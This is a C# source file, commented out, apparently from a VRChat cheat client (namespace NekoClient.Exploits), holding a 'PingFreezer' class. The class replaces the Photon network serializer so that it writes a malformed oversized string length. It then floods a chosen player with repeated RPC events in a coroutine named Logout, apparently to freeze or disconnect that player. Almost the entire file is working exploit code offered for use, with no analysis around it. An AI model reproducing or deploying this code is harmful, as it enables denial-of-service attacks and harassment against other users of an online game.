using System.Collections;
using System.Linq;
using UnityEngine;

#if STEAM
using PhotonNetwork = DKGBGACHCGF;
using PhotonPlayer = MAAMBGJCOKM;
#elif OCULUS
using PhotonNetwork = DKGBGACHCGF;
using PhotonPlayer = MAAMBGJCOKM;
#endif

using ExitGames.Client.Photon;
using VRCSDK2;
using System.Text;
/*
namespace NekoClient.Exploits
{
    public class PingFreezer : MonoBehaviour
    {
        public void Start()
        {
            DontDestroyOnLoad(this);
        }

        public static byte[] SerializeFunction(object NLOMAFMJOLO)
        {
            
            VRC_EventLog.OCPMPAGOOFC dgjgofinhka = (VRC_EventLog.OCPMPAGOOFC)NLOMAFMJOLO;

            byte[] array = new byte[40768];
            int num = 0;

            Protocol.Serialize(dgjgofinhka.NKFEKEFDJFH, array, ref num);
            Protocol.Serialize(dgjgofinhka.KODCKHKDGIM, array, ref num);

            int value = (int)(dgjgofinhka.FLMAKOBAIFB >> 32);
            int value2 = (int)(dgjgofinhka.FLMAKOBAIFB & (long)-1);

            Protocol.Serialize(value, array, ref num);
            Protocol.Serialize(value2, array, ref num);

            if (dgjgofinhka.KGLIHMANHNL == null)
            {
                dgjgofinhka.KGLIHMANHNL = string.Empty;
            }

            byte[] bytes = Encoding.UTF8.GetBytes(dgjgofinhka.KGLIHMANHNL);

            Protocol.Serialize(short.MaxValue, array, ref num);

            bytes.CopyTo(array, num);

            num += bytes.Length;

            Protocol.Serialize((int)dgjgofinhka.JDKODJBJPOE.EventType, array, ref num);
            Protocol.Serialize((int)dgjgofinhka.JDKODJBJPOE.ParameterBoolOp, array, ref num);
            Protocol.Serialize(dgjgofinhka.JDKODJBJPOE.ParameterFloat, array, ref num);
            Protocol.Serialize(dgjgofinhka.JDKODJBJPOE.ParameterInt, array, ref num);
            bytes = Encoding.UTF8.GetBytes(dgjgofinhka.JDKODJBJPOE.ParameterString);

            Protocol.Serialize((short)bytes.Length, array, ref num);
            bytes.CopyTo(array, num);
            num += bytes.Length;

            Protocol.Serialize(dgjgofinhka.IJDHAKMDJBB, array, ref num);
            Protocol.Serialize((short)dgjgofinhka.HKOBMFCJOGM, array, ref num);

            if (dgjgofinhka.JDKODJBJPOE.ParameterBytes == null)
            {
                dgjgofinhka.JDKODJBJPOE.ParameterBytes = new byte[0];
            }

            Protocol.Serialize((short)dgjgofinhka.JDKODJBJPOE.ParameterBytes.Length, array, ref num);
            dgjgofinhka.JDKODJBJPOE.ParameterBytes.CopyTo(array, num);
            num += dgjgofinhka.JDKODJBJPOE.ParameterBytes.Length;

            byte[] array2 = new byte[num];

            for (int i = 0; i < num; i++)
            {
                array2[i] = array[i];
            }

            dgjgofinhka.DNLDFDBKEPI = array2;

            return array2;
        }

        public bool Enabled = false;
        private IEnumerator m_coroutine;

        private IEnumerator Logout()
        {
            VRC_EventHandler.VrcEvent eventt = new VRC_EventHandler.VrcEvent();

            eventt.Name = "e";
            eventt.ParameterInt = 1;

            // find in LogEvent
            VRC_EventLog.OCPMPAGOOFC ecllcbdnljp = new VRC_EventLog.OCPMPAGOOFC
            {
                MOCNGDCAKEE = 6456,
                OPAPMIIAPOF = 456546,
                LPFDBBPACDK = 5464,
                NBAKPLONKLE = 32,
                EMOKJNGDCBH = eventt,
                HKOBMFCJOGM = VRC_EventHandler.VrcBroadcastType.Always
            };

            while (VRC.PlayerManager.GetPlayer(Target) != null && Enabled)
            {
                Protocol.TypeDict.Remove(typeof(VRC_EventLog.OCPMPAGOOFC));
                Protocol.CodeDict.Remove(102);
                PhotonPeer.RegisterType(typeof(VRC_EventLog.OCPMPAGOOFC), (byte)102, new SerializeMethod(SerializeFunction), new DeserializeMethod(MAAIIEHFMAL.GMPIGCEOMAM));

                PhotonView photonView = PhotonView.Get(VRC_EventLog.Instance.Replicator);

                for (int i = 0; i < 50; i++)
                {
                    photonView.RpcSecure("ProcessEvent", Target, true, new object[]
                    {
                            ecllcbdnljp
                    });

                    yield return new WaitForSeconds(0.007f);
                }
                Protocol.TypeDict.Remove(typeof(VRC_EventLog.OCPMPAGOOFC));
                Protocol.CodeDict.Remove(102);
                PhotonPeer.RegisterType(typeof(VRC_EventLog.OCPMPAGOOFC), 102, new SerializeMethod(MAAIIEHFMAL.DOFLFLMOJJG), new DeserializeMethod(MAAIIEHFMAL.GMPIGCEOMAM));
            }

            yield return new WaitForEndOfFrame();

        }

        public void Trigger()
        {
            if (!Enabled)
            {
                Enabled = true;
                m_coroutine = Logout();

                StartCoroutine(m_coroutine);
            }
            else
            {
                Enabled = false;
                StopCoroutine(m_coroutine);
            }
        }

        private PhotonPlayer Target;

        public void SetTarget(PhotonPlayer target)
        {
            Target = target;
        }
    }
}*/